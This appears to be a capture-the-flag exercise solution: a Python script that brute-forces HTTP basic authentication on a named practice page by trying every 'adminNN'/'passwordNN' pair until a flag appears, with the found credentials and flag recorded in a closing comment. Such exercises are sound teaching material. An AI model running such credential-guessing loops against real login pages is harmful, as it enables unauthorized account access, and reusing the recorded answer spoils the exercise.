

# Make a Python script that logs in to this page:
# https://bowneconsultingcontent.com/A2.5/index.php
# with these parameters:
# Username: admin with a two-digit number appended to it, like admin11
# Password: password with a two-digit number appended to it, like password11
# User-Agent: python

import requests
import sys

# Input
url = 'https://bowneconsultingcontent.com/A2.5/index.php'
headers = {'User-Agent': 'python'}

# Process, output
for username in range(100):
    user = 'admin' + str(username).rjust(2, '0')
    for password in range(100):
        pwd = 'password' + str(password).rjust(2, '0')
        # print(f"Trying {user}, {pwd}")
        r = requests.get(url, auth=(user, pwd), headers=headers)
        if 'flag' in r.text:
            print(f"The '{user}' password is '{pwd}'")
            print(r.text)
            sys.exit()












# The 'admin25' password is 'password78'
# The flag is using-requests
